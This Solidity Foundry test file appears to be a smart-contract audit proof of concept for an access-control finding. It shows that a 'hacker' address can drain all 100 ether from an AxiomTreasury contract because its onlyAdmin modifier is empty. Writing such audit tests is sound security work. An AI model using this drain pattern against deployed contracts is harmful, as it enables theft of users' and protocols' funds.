// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/core/AxiomTreasury.sol";

contract TreasuryAuditTest is Test {
    AxiomTreasury treasury;
    address admin = makeAddr("admin");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.startPrank(admin);
        
        // 1. Deploy Treasury sebagai modul standalone
        treasury = new AxiomTreasury();
        
        // 2. Simulasi: Protokol mengirim uang fee ke Treasury
        vm.deal(address(treasury), 100 ether);
        
        vm.stopPrank();
    }

    /**
     * @notice POC untuk Finding [H-02]: Unprotected Access Control
     * @dev Membuktikan bahwa modifier onlyAdmin() kosong dan bisa ditembus.
     */
    function testFinding_TreasuryDrain() public {
        vm.startPrank(hacker); // Kita login sebagai Hacker
        
        console.log("Saldo Treasury Awal:", address(treasury).balance);
        console.log("Saldo Hacker Awal:", hacker.balance);
        
        // Cek apakah Hacker (bukan admin) bisa withdraw?
        // Harusnya GAGAL jika modifier benar.
        // Tapi karena kosong, ini akan BERHASIL.
        
        treasury.withdraw(hacker, 100 ether);
        
        console.log("Saldo Treasury Akhir:", address(treasury).balance);
        console.log("Saldo Hacker Akhir:", hacker.balance);
        
        // Assert bahwa pencurian BERHASIL
        assertEq(address(treasury).balance, 0);
        assertEq(hacker.balance, 100 ether);
        
        vm.stopPrank();
    }
}